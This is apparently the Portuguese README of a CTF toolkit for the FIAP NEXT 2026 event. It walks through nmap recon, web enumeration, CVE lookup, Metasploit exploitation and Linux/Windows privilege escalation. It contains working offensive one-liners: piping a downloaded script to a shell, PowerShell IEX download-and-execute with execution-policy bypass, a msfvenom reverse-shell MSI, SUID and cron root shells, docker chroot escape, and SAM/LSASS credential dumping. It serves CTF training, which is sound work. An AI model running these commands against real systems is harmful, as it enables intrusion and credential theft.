# NextFiap-CTF

Scripts e guia de referência para o CTF do FIAP NEXT 2026: recon, enumeração, busca de CVE e privesc.

Uso apenas em ambiente autorizado (CTF, laboratório, máquinas próprias).

## Índice

1. [O que tem aqui](#1-o-que-tem-aqui)
2. [Instalação](#2-instalação)
3. [Antes de começar (variáveis e tmux)](#3-antes-de-começar)
4. [recon.sh](#4-reconsh)
5. [web_enum.sh](#5-web_enumsh)
6. [cve_lookup.py](#6-cve_lookuppy)
7. [searchsploit e Metasploit: achar e confirmar exploit](#7-achar-e-confirmar-exploit)
8. [Levar os scripts para o alvo](#8-levar-os-scripts-para-o-alvo)
9. [linux_privesc.sh](#9-linux_privescsh)
10. [win_privesc.ps1](#10-win_privescps1)
11. [Nmap na mão (sem script)](#11-nmap-na-mão)
12. [Fluxo completo no CTF](#12-fluxo-completo-no-ctf)
13. [Problemas comuns](#13-problemas-comuns)

---

## 1. O que tem aqui

```
scripts/
  recon.sh           recon completo de um alvo (nmap + busca de exploit + enum por serviço)
  web_enum.sh        enumeração web (arquivos esquecidos, diretórios, vhosts)
  cve_lookup.py      busca CVEs no NVD por produto/versão ou direto do XML do nmap
  linux_privesc.sh   procura caminhos para virar root (roda DENTRO do alvo Linux)
  win_privesc.ps1    procura caminhos para virar SYSTEM (roda DENTRO do alvo Windows)
docs/
  CTF_Field_Guide_FIAP_NEXT.pdf    guia completo: nmap flag por flag, web, msfvenom, privesc, AD, pivoting
  CTF_Field_Guide_FIAP_NEXT.docx   mesmo conteúdo em Word
```

Onde cada script roda:

| Script | Roda onde | Quando |
|---|---|---|
| `recon.sh` | Kali | assim que receber o IP do alvo |
| `web_enum.sh` | Kali | quando aparecer porta web (80, 443, 8080...) |
| `cve_lookup.py` | Kali | quando tiver uma versão de serviço |
| `linux_privesc.sh` | alvo Linux | depois de ter shell como usuário comum |
| `win_privesc.ps1` | alvo Windows | depois de ter shell como usuário comum |

---

## 2. Instalação

**Passo 1: clonar o repositório**

```bash
git clone https://github.com/rabelojp41/NextFiap-CTF.git
cd NextFiap-CTF/scripts
```

**Passo 2: dar permissão de execução**

```bash
chmod +x *.sh *.py
```

Sem isso aparece `Permission denied` ao rodar `./recon.sh`.

**Passo 3: instalar as dependências**

```bash
sudo apt update
sudo apt install -y nmap exploitdb seclists ffuf gobuster feroxbuster whatweb smbclient enum4linux-ng snmp nfs-common
```

| Pacote | Usado por | Para quê |
|---|---|---|
| `nmap` | recon.sh | scan de portas e versões |
| `exploitdb` | recon.sh, cve_lookup.py | comando `searchsploit` |
| `seclists` | recon.sh, web_enum.sh | wordlists (fica em `/usr/share/seclists`) |
| `ffuf` / `gobuster` / `feroxbuster` | web_enum.sh, recon.sh | fuzzing de diretórios |
| `whatweb` | recon.sh, web_enum.sh | identifica tecnologia do site |
| `smbclient`, `enum4linux-ng` | recon.sh | enumeração SMB |
| `snmp` | recon.sh | `snmpwalk` |
| `nfs-common` | recon.sh | `showmount` |

O `cve_lookup.py` só usa Python padrão, não precisa de `pip install`.

Se faltar alguma ferramenta, os scripts avisam e pulam aquela parte. Não quebram.

**Passo 4 (opcional): rodar de qualquer pasta**

```bash
echo "export PATH=\$PATH:$(pwd)" >> ~/.zshrc
source ~/.zshrc
```

Depois disso dá para chamar `recon.sh 10.10.10.5` sem o `./` e de qualquer diretório.

**Passo 5: testar antes do CTF**

```bash
./recon.sh 127.0.0.1 teste
```

Se terminar com `Recon finalizado`, está tudo certo.

---

## 3. Antes de começar

Guardar IPs em variáveis evita erro de digitação:

```bash
export IP=10.10.10.5                                         # IP do alvo
export KALI=$(ip -4 a show tun0 | grep -oP 'inet \K[\d.]+')  # seu IP na VPN do CTF
echo $IP $KALI                                               # confere
```

Se o CTF não usar VPN, troque `tun0` pela sua interface (`eth0`). Veja com `ip a`.

Use `tmux` para ter várias janelas no mesmo terminal:

```bash
tmux new -s ctf
```

| Atalho | Ação |
|---|---|
| `Ctrl+b` depois `c` | nova janela |
| `Ctrl+b` depois `n` / `p` | próxima / anterior |
| `Ctrl+b` depois `%` | divide a tela na vertical |
| `Ctrl+b` depois `"` | divide na horizontal |
| `Ctrl+b` depois `d` | sai sem fechar (volta com `tmux a`) |

---

## 4. recon.sh

**O que faz:** descobre todas as portas abertas, identifica serviços e versões, procura exploits para essas versões e enumera cada serviço (web, SMB, FTP, SNMP, NFS, LDAP). Tudo salvo numa pasta.

### Como usar

**Passo 1:** liberar o sudo antes (o script precisa de root para o scan SYN e para detectar o SO)

```bash
sudo -v
```

**Passo 2:** rodar

```bash
./recon.sh <IP> [pasta_saida]
```

| Argumento | Obrigatório | O que é | Padrão |
|---|---|---|---|
| `<IP>` | sim | IP ou hostname do alvo | - |
| `[pasta_saida]` | não | onde salvar os resultados | `recon_<IP>` |

Exemplos:

```bash
./recon.sh 10.10.10.5            # salva em ./recon_10.10.10.5/
./recon.sh 10.10.10.5 maquina1   # salva em ./maquina1/
./recon.sh $IP                   # usando a variável
```

**Passo 3:** acompanhar. Enquanto ele roda, abra outra janela do tmux e vá lendo os arquivos conforme aparecem.

### O que ele faz, em ordem

| Fase | Comando por trás | Mensagem na tela |
|---|---|---|
| 1 | `ping -c1` | `Host responde ICMP` ou `Sem ICMP - seguindo com -Pn` |
| 2 | `nmap -Pn -p- --min-rate 5000 -T4 --open` | `Portas abertas: 21,22,80` |
| 3 | `nmap -Pn -sV -sC -O -p <abertas>` | lista porta, serviço e versão |
| 4 | `nmap --script vuln` (em segundo plano) | `03_vuln.nmap pronto` |
| 5 | `nmap -sU --top-ports 20` (em segundo plano) | `04_udp.nmap pronto` |
| 6 | `searchsploit --nmap` | lista de exploits |
| 7 | `cve_lookup.py --nmap` | lista de CVEs |
| 8 | enum de cada serviço encontrado | headers, shares, FTP anônimo... |

As flags do nmap usadas:

| Flag | O que faz |
|---|---|
| `-Pn` | não desiste se o alvo não responder ping |
| `-p-` | todas as 65535 portas (sem isso são só as 1000 mais comuns) |
| `--min-rate 5000` | mínimo de 5000 pacotes por segundo, deixa o `-p-` rápido |
| `-T4` | velocidade agressiva |
| `--open` | mostra só portas abertas |
| `-sV` | descobre a versão de cada serviço |
| `-sC` | roda os scripts NSE padrão |
| `-O` | tenta descobrir o sistema operacional |
| `--script vuln` | scripts que testam CVEs conhecidas |
| `-sU --top-ports 20` | UDP nas 20 portas mais comuns |
| `-oA nome` | salva em 3 formatos (.nmap, .xml, .gnmap) |

### Arquivos gerados (leia nesta ordem)

| Arquivo | O que tem | O que procurar |
|---|---|---|
| `02_detail.nmap` | serviços e versões | **comece por aqui**: versões antigas, `Anonymous FTP login allowed`, títulos de página |
| `05_searchsploit.txt` | exploits do Exploit-DB | exploit com a versão exata |
| `06_nvd.txt` | CVEs com nota CVSS | linhas com `[KEV]` |
| `03_vuln.nmap` | scripts de vuln | palavra `VULNERABLE` |
| `20_smb_nxc.txt`, `21_smbclient.txt` | shares SMB | share com `READ` ou `WRITE` |
| `30_ftp_ls.txt`, `31_ftp_dump/` | FTP anônimo | arquivos baixados (senhas, chaves, notas) |
| `10_headers_<porta>.txt` | headers HTTP | `Server`, `X-Powered-By` |
| `11_robots_<porta>.txt` | robots.txt | caminhos com `Disallow` |
| `13_dirs_<porta>.txt` | diretórios encontrados | `/admin`, `/backup`, `/uploads` |
| `04_udp.nmap` | portas UDP | 161 (SNMP), 69 (TFTP) |
| `01_allports.*` | só a lista de portas | - |

Para procurar algo em todos os arquivos de uma vez:

```bash
grep -ri "vulnerable\|anonymous\|password" recon_10.10.10.5/
```

---

## 5. web_enum.sh

**O que faz:** primeiro passe em um site: tecnologia, arquivos esquecidos, comentários no HTML, diretórios escondidos e subdomínios virtuais.

### Como usar

```bash
./web_enum.sh <url> [dominio]
```

| Argumento | Obrigatório | O que é |
|---|---|---|
| `<url>` | sim | URL completa com `http://` ou `https://` e a porta se não for 80/443. Sem `/` no final |
| `[dominio]` | não | se passar, procura subdomínios virtuais (vhosts) |

Exemplos:

```bash
./web_enum.sh http://10.10.10.5
./web_enum.sh http://10.10.10.5:8080
./web_enum.sh https://10.10.10.5:8443
./web_enum.sh http://alvo.ctf alvo.ctf
```

**Quando usar o domínio:** se ao abrir `http://IP` o site redireciona para um nome (ex.: `alvo.ctf`), primeiro adicione no hosts:

```bash
echo "$IP alvo.ctf" | sudo tee -a /etc/hosts
./web_enum.sh http://alvo.ctf alvo.ctf
```

Achou `dev.alvo.ctf`? Adicione também no `/etc/hosts` e rode o script de novo nele.

### O que ele faz, em ordem

| Etapa | O que mostra | O que procurar |
|---|---|---|
| Headers / tecnologia | servidor, linguagem, CMS | versão para pesquisar CVE |
| Arquivos clássicos | testa `robots.txt`, `.git/HEAD`, `.env`, `backup.zip`, `phpinfo.php`, `admin/`... | qualquer `[200]` |
| `.git` exposto | aviso em vermelho | baixe com `git-dumper URL/.git ./repo` e rode `git log -p` |
| Comentários e JS | `<!-- ... -->` e arquivos `.js` | senhas, rotas, chaves de API |
| Diretórios (ffuf) | caminhos encontrados, salvos em `ffuf_dirs.json` | `/admin`, `/upload`, `/api`, `/backup` |
| VHOSTs | subdomínios que respondem diferente | painel de dev, admin |
| Checklist manual | lembretes de SQLi, LFI, SSTI, command injection | - |

Se **todo** caminho voltar `200`, o site responde "200" para tudo. Rode o ffuf na mão filtrando o tamanho:

```bash
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac
# -ac calibra sozinho. Ou: -fs <tamanho_que_se_repete>
```

---

## 6. cve_lookup.py

**O que faz:** recebe um serviço e versão e lista as CVEs conhecidas do banco oficial (NVD). Mostra a nota de gravidade (CVSS) e marca as que estão na lista de falhas exploradas de verdade (KEV).

### Como usar

```bash
python3 cve_lookup.py "<produto> <versão>" [opções]
python3 cve_lookup.py --nmap <arquivo.xml> [opções]
```

| Flag | O que faz | Exemplo |
|---|---|---|
| `"termo"` | produto + versão entre aspas | `"vsftpd 2.3.4"` |
| `--nmap arq.xml` | lê todos os serviços com versão do XML do nmap | `--nmap 02_detail.xml` |
| `--max N` | quantas CVEs mostrar por serviço (padrão: 8) | `--max 15` |
| `--exploit` | também roda o `searchsploit` (já é automático com `--nmap`) | |
| `-h` | ajuda | |

Exemplos:

```bash
python3 cve_lookup.py "vsftpd 2.3.4"
python3 cve_lookup.py "Apache HTTP Server 2.4.49" --max 10
python3 cve_lookup.py "webmin 1.910" --exploit
python3 cve_lookup.py --nmap recon_10.10.10.5/02_detail.xml
```

O XML vem de qualquer nmap com `-oA` ou `-oX` e `-sV`. O `recon.sh` já gera em `02_detail.xml`.

### Como ler a saída

```
=== porta 10000 ===
[*] Webmin 1.910
  CVE-2019-15107   CVSS 9.8 [KEV - explorado ativamente]
      An issue was discovered in Webmin <=1.920. The parameter old in password_change.cgi ...
  CVE-2019-12840   CVSS 8.8
      ...
  Exploit-DB:
    Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit) | linux/remote/47230.rb
```

| Parte | Significado |
|---|---|
| `CVE-2019-15107` | ID da falha. Use para pesquisar exploit |
| `CVSS 9.8` | gravidade de 0 a 10. Vermelho = 9 ou mais, amarelo = 7 a 9 |
| `[KEV]` | falha explorada no mundo real. Quase sempre tem PoC pronto. **Prioridade** |
| descrição | leia a faixa de versões afetadas (`<=1.920`) e compare com a versão do alvo |
| `Exploit-DB` | exploits prontos do searchsploit |

### Observações

- Sem chave de API o NVD limita as consultas. O script espera 6,5 s entre um serviço e outro. Com chave (grátis em nvd.nist.gov/developers) fica mais rápido:
  ```bash
  export NVD_API_KEY=sua_chave
  ```
- Precisa de internet na Kali. Sem internet, aparece `NVD indisponível`. Use o `searchsploit`, que é offline.
- O script traduz alguns nomes do nmap para o nome do NVD (ex.: `MiniServ` vira `Webmin`, `Apache httpd` vira `Apache HTTP Server`).
- Se não achar nada, tente encurtar a versão: `"OpenSSH 7.2"` em vez de `"OpenSSH 7.2p2 Ubuntu 4ubuntu2.8"`.
- **CVE na lista não significa que o alvo está vulnerável.** Confirme (seção 7).

---

## 7. Achar e confirmar exploit

### Passo 1: pegar a versão exata

Do nmap com `-sV`, coluna VERSION:

```
21/tcp    open  ftp   vsftpd 2.3.4
10000/tcp open  http  MiniServ 1.910 (Webmin httpd)
```

Outras fontes: página "Sobre" do sistema, rodapé do site, headers HTTP, banner (`nc $IP 21`).

Ou pelo Metasploit, com os scanners de versão:

```
msfconsole -q
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.5
run
```

Troque `smb/smb_version` por `http/http_version`, `ssh/ssh_version`, `ftp/ftp_version` ou `mysql/mysql_version`, conforme o serviço.

### Passo 2: searchsploit (Exploit-DB, funciona offline)

| Comando | O que faz |
|---|---|
| `searchsploit vsftpd 2.3.4` | busca por nome e versão |
| `searchsploit webmin 1.9` | se não achar, encurte a versão |
| `searchsploit -t webmin` | busca só no título (menos lixo) |
| `searchsploit -w webmin` | mostra o link no exploit-db.com |
| `searchsploit -x 47230` | abre o exploit para ler (o número é o que vem antes de `.rb`/`.py` no Path) |
| `searchsploit -m 47230` | copia o exploit para a pasta atual |
| `searchsploit --nmap 02_detail.xml` | busca todas as versões que o nmap achou |
| `searchsploit -u` | atualiza a base |

Como ler a coluna **Path**:

| Começa com | Significa |
|---|---|
| `remote/` | explora pela rede (o que você quer primeiro) |
| `webapps/` | falha em aplicação web |
| `local/` | escalação de privilégio (usa depois de ter shell) |
| `dos/` | só derruba o serviço. Não serve para o CTF |

| Termina com | Como usar |
|---|---|
| `.rb` | módulo do Metasploit. Procure com `search` dentro do msfconsole |
| `.py` | `searchsploit -m ID` e depois `python3 arquivo.py` (leia antes, às vezes precisa editar IP/porta) |
| `.sh` / `.c` / `.txt` | leia com `-x`. `.c` precisa compilar com `gcc` |

### Passo 3: cve_lookup.py

```bash
python3 cve_lookup.py "vsftpd 2.3.4"
```

Com o ID da CVE, procure exploit:

```bash
msfconsole -q -x "search cve:2019-15107; exit"
```

E no Google/GitHub: `CVE-2019-15107 poc`. Leia o código antes de rodar.

### Passo 4: confirmar com o check do Metasploit

```
msfconsole -q
search webmin
use exploit/linux/http/webmin_backdoor
show options          # mostra o que precisa preencher
set RHOSTS 10.10.10.5
set LHOST tun0
check
```

Respostas do `check`:

| Resposta | Significa |
|---|---|
| `The target is vulnerable` | confirmado, pode rodar `run` |
| `The target appears to be vulnerable` | provável, pela versão |
| `The target is not exploitable` / `Safe` | não é esse o caminho |
| `Cannot reliably check exploitability` | o módulo não sabe testar, decida pela versão |
| `This module does not support check` | não tem `check`, decida pela versão |

O `check` **não mostra a versão**. Ele só responde se o alvo parece vulnerável àquele exploit. A versão vem do nmap ou dos scanners `auxiliary/scanner/*/*_version`.

### Passo 5: explorar

```
run
```

Se abrir sessão: `sessions -i 1` para entrar. Depois disso, vá para a seção 8.

---

## 8. Levar os scripts para o alvo

Os scripts de privesc rodam **dentro** do alvo. O alvo normalmente não tem internet, então você serve os arquivos a partir da Kali.

**Na Kali**, dentro da pasta `scripts/`:

```bash
cd NextFiap-CTF/scripts
python3 -m http.server 80
```

Deixe rodando. Cada download aparece no log como `GET /linux_privesc.sh 200`.

**No alvo Linux**, tente nessa ordem:

```bash
cd /tmp
wget http://$KALI/linux_privesc.sh
curl -O http://$KALI/linux_privesc.sh
```

Sem wget e sem curl, use base64:

```bash
base64 -w0 linux_privesc.sh            # na Kali: copia a saída inteira
echo 'COLE_AQUI' | base64 -d > /tmp/linux_privesc.sh   # no alvo
```

**No alvo Windows:**

```powershell
certutil -urlcache -f http://<IP_KALI>/win_privesc.ps1 C:\Windows\Temp\w.ps1
iwr http://<IP_KALI>/win_privesc.ps1 -OutFile C:\Windows\Temp\w.ps1
```

Pela shell do Evil-WinRM é mais simples: `upload win_privesc.ps1`.

`/tmp` (Linux) e `C:\Windows\Temp` (Windows) são pastas onde qualquer usuário consegue escrever.

---

## 9. linux_privesc.sh

**O que faz:** procura configurações erradas que deixam um usuário comum virar root. Marca em vermelho o que é explorável.

### Como usar (no alvo)

```bash
bash linux_privesc.sh 2>/dev/null | tee enum.txt
```

| Parte do comando | Para quê |
|---|---|
| `bash linux_privesc.sh` | roda o script (não precisa de `chmod +x`) |
| `2>/dev/null` | esconde erros de "Permission denied" |
| `\| tee enum.txt` | mostra na tela e salva em `enum.txt` para reler |

Para reler só os achados importantes:

```bash
grep '!!!' enum.txt
```

### O que cada bloco checa e o que fazer

| Bloco | Linha vermelha | O que fazer |
|---|---|---|
| IDENTIDADE | grupo `docker`, `lxd`, `disk`, `adm`, `shadow` | `docker`: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| SUDO | `NOPASSWD` ou binário listado | procure o binário em gtfobins.github.io, filtro **Sudo** |
| SUDO | `LD_PRELOAD preservado` | guia em PDF, seção 7.3 |
| SUDO | `(ALL, !root)` | `sudo -u#-1 <comando>` (CVE-2019-14287) |
| SUID / SGID | `SUID GTFOBin: /usr/bin/find` | gtfobins.github.io, filtro **SUID** (ex.: `find . -exec /bin/sh -p \; -quit`) |
| SUID / SGID | `pkexec` | PwnKit (CVE-2021-4034) se `pkexec --version` < 0.120 |
| CAPABILITIES | `cap_setuid` | ex.: python com cap_setuid: `python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'` |
| CRON | `Script de cron GRAVÁVEL` | adicione `cp /bin/bash /tmp/rb; chmod +s /tmp/rb` no script, espere, rode `/tmp/rb -p` |
| ARQUIVOS | `/etc/passwd GRAVÁVEL` | crie um usuário root (comando aparece na própria mensagem) |
| ARQUIVOS | `/etc/shadow LEGÍVEL` | `unshadow` e quebre com `john` |
| PATH | diretório do PATH gravável | PATH hijack (guia, seção 7.3) |
| CREDENCIAIS | históricos, `.env`, `wp-config.php`, `id_rsa` | teste as senhas com `su root` e nos outros serviços |
| REDE | porta só em `127.0.0.1` | serviço interno: `ssh -L 8000:127.0.0.1:PORTA user@alvo` |
| CONTAINER | `docker.sock exposto` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| KERNEL | versão do kernel | **último recurso**, pode derrubar a máquina |

Para pegar o que o script não pega, use também:

- **LinPEAS**: mais completo. Baixe na Kali e sirva igual (`curl http://$KALI/linpeas.sh | sh`)
- **pspy**: mostra processos e cron rodando como root em tempo real (`./pspy64`)

---

## 10. win_privesc.ps1

**O que faz:** procura configurações erradas no Windows que deixam virar SYSTEM ou administrador.

### Como usar (no alvo)

Direto da memória (não grava em disco):

```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP_KALI>/win_privesc.ps1')"
```

Salvando em disco:

```powershell
iwr http://<IP_KALI>/win_privesc.ps1 -OutFile C:\Windows\Temp\w.ps1
powershell -ep bypass -f C:\Windows\Temp\w.ps1
```

Pelo Evil-WinRM:

```
upload win_privesc.ps1
.\win_privesc.ps1
```

| Parte do comando | Para quê |
|---|---|
| `-ep bypass` | ExecutionPolicy Bypass: deixa rodar script não assinado nessa execução |
| `IEX(...)` | baixa e executa direto na memória |
| `-f arquivo.ps1` | executa o arquivo |

### O que cada bloco checa e o que fazer

| Bloco | Linha vermelha | O que fazer |
|---|---|---|
| PRIVILÉGIOS | `SeImpersonatePrivilege` | `PrintSpoofer64.exe -i -c cmd` ou `GodPotato.exe -cmd "cmd /c whoami"`. Comum em contas de IIS e MSSQL |
| PRIVILÉGIOS | `SeBackupPrivilege` | `reg save HKLM\SAM sam` e `reg save HKLM\SYSTEM sys`, depois `secretsdump.py -sam sam -system sys LOCAL` na Kali |
| PRIVILÉGIOS | `SeDebugPrivilege` | dump do LSASS |
| AlwaysInstallElevated | `ON` | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f msi -o r.msi` e `msiexec /quiet /qn /i r.msi` |
| SERVIÇOS | `Unquoted` | coloque um exe com o nome da primeira parte do caminho (ex.: `C:\Program Files\My.exe`) |
| SERVIÇOS | `Binário gravável` | troque o exe por um do msfvenom (`-f exe-service`) e reinicie o serviço |
| CREDENCIAIS | `AutoLogon` | usuário e senha em texto, teste no `evil-winrm` |
| CREDENCIAIS | `cmdkey` com entrada | `runas /savecred /user:<usuario> cmd` |
| CREDENCIAIS | histórico do PowerShell | comandos antigos com senha |
| CREDENCIAIS | `unattend.xml` | senha de instalação (às vezes em base64) |
| TAREFAS | tarefa não-Microsoft | veja se o executável dela é gravável |
| SOFTWARE | lista de programas | jogue cada versão no `cve_lookup.py` |

Para ir além: **winPEAS** (`/usr/share/peass/winpeas/` no Kali), **PowerUp** (`Invoke-AllChecks`), **SharpUp**.

---

## 11. Nmap na mão

Sem o `recon.sh`, o mesmo fluxo em 4 comandos:

```bash
# 1. todas as portas abertas
sudo nmap -v -p- --min-rate 5000 -Pn -n --open -oA 01_all $IP

# 2. guarda só os números das portas abertas
ports=$(grep -oP '\d+/open' 01_all.gnmap | cut -d/ -f1 | paste -sd,)
echo $ports

# 3. versão + scripts padrão só nessas portas
sudo nmap -v -p$ports -sCV -Pn -oA 02_detail $IP

# 4. busca exploit
searchsploit --nmap 02_detail.xml
python3 cve_lookup.py --nmap 02_detail.xml
```

| Flag | O que faz |
|---|---|
| `-v` | mostra cada porta assim que acha, sem esperar o fim |
| `-p-` | todas as 65535 portas |
| `-p22,80` | só essas portas |
| `--min-rate 5000` | mínimo de 5000 pacotes por segundo |
| `-Pn` | não desiste se o alvo não responder ping |
| `-n` | não resolve DNS (mais rápido) |
| `--open` | mostra só as abertas |
| `-sV` | versão do serviço |
| `-sC` | scripts NSE padrão |
| `-sCV` | `-sC` e `-sV` juntos |
| `-O` | sistema operacional (precisa sudo) |
| `-sU` | UDP |
| `--script <nome>` | roda um script NSE específico |
| `-oA nome` | salva em `nome.nmap` (leitura), `nome.xml` (searchsploit/cve_lookup) e `nome.gnmap` (grep) |
| `-oN arq` | salva só o texto normal |

Scripts NSE úteis:

```bash
ls /usr/share/nmap/scripts | grep smb               # lista scripts de um serviço
nmap --script-help smb-vuln-ms17-010                # explica o que o script faz
nmap -v -p445 --script smb-vuln-ms17-010 $IP        # roda um script
nmap -v -p445 --script "smb-vuln-*" $IP             # roda todos que começam com smb-vuln
nmap -v -sV --script vuln -p$ports $IP              # todos os scripts de vuln
nmap -v -sV --script vulners $IP                    # CVEs pela versão
```

Lista completa de scripts por porta, os que exploram (vsftpd, Shellshock, distcc...) e todas as flags no guia em PDF, seção 2.

---

## 12. Fluxo completo no CTF

```
1. sudo -v
2. ./recon.sh $IP                          (janela 1 do tmux)
3. ler 02_detail.nmap                       (janela 2)
4. porta web?   -> ./web_enum.sh http://$IP:PORTA
5. versão?      -> 05_searchsploit.txt, 06_nvd.txt, cve_lookup.py
6. confirmar    -> check do Metasploit / script NSE da CVE
7. explorar     -> run / exploit do searchsploit / PoC
8. shell        -> python3 -m http.server 80 na Kali
9. privesc      -> linux_privesc.sh ou win_privesc.ps1
10. flag        -> find / -iname '*flag*' 2>/dev/null
                   Get-ChildItem C:\ -Recurse -Include *flag*,user.txt,root.txt -ErrorAction SilentlyContinue
```

Travou 30 minutos no mesmo vetor? Muda de alvo e volta depois.

---

## 13. Problemas comuns

| Problema | Causa | Solução |
|---|---|---|
| `Permission denied` ao rodar `./script.sh` | sem permissão de execução | `chmod +x *.sh *.py` ou rode com `bash script.sh` |
| `bash: ./recon.sh: /usr/bin/env: bad interpreter` | arquivo salvo com quebra de linha do Windows | `sed -i 's/\r$//' *.sh` |
| recon.sh parado pedindo senha | sudo sem cache | `sudo -v` antes |
| `Nenhuma porta aberta encontrada` | VPN caiu, IP errado ou rate alto demais | `ping $IP`, confira a VPN, baixe para `--min-rate 1000` |
| Poucas portas encontradas | pacotes perdidos na VPN | rode de novo com `--min-rate 1000` |
| `NVD indisponível` | sem internet ou limite do NVD | espere 30 s ou use só o `searchsploit` |
| `searchsploit não instalado` | pacote faltando | `sudo apt install exploitdb` |
| ffuf mostra tudo `200` | site responde 200 para qualquer caminho | `-ac` ou `-fs <tamanho>` |
| Wordlist não encontrada | SecLists não instalada | `sudo apt install seclists` |
| `wget: command not found` no alvo | ferramenta ausente | `curl -O`, ou base64 (seção 8) |
| PowerShell bloqueia o script | ExecutionPolicy | use `-ep bypass` |
| Exploit do Metasploit sem sessão | `LHOST` errado | `set LHOST tun0` (interface da VPN, não `eth0`) |

---

Guia completo, com todas as flags do nmap, msfvenom, reverse shells, ataques de senha, AD e pivoting: [`docs/CTF_Field_Guide_FIAP_NEXT.pdf`](docs/CTF_Field_Guide_FIAP_NEXT.pdf)
